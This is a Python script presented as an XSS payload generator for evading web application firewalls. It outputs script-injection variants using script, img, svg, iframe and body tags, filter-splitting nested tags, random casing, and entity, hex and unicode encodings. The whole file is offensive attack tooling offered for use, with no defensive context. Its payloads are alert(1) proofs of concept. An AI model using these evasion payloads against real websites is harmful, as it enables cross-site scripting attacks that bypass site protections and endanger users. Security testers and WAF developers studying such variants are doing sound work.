import random

# Base payload
base_payload = '<script>alert(1)</script>'

# Encoding functions
def html_entity_encode(payload):
    return ''.join(f'&#{ord(c)};' for c in payload)

def hex_encode(payload):
    return ''.join(f'\\x{ord(c):02x}' for c in payload)

def unicode_encode(payload):
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def random_case(payload):
    return ''.join(c.upper() if random.choice([0, 1]) else c.lower() for c in payload)

# Payload generators
def generate_payloads():
    variants = []

    variants.append(f'<script>alert(1)</script>')
    variants.append(f'<ScRiPt>alert(1)</ScRiPt>')
    variants.append(f'<img src=x onerror=alert(1)>')
    variants.append(f'<svg onload=alert(1)>')
    variants.append(html_entity_encode('<script>alert(1)</script>'))
    variants.append(hex_encode('<script>alert(1)</script>'))
    variants.append(unicode_encode('<script>alert(1)</script>'))
    variants.append(f'<iframe src="javascript:alert(1)"></iframe>')
    variants.append(f'<body onload=alert(1)>')
    variants.append(f'<scr<script>ipt>alert(1)</script>')
    variants.append(random_case('<script>alert(1)</script>'))

    return variants

# Generate and print payloads
if __name__ == "__main__":
    print("[*] XSS Payload Generator for WAF Evasion\n")
    payloads = generate_payloads()
    for i, p in enumerate(payloads, 1):
        print(f"[{i}] {p}\n")
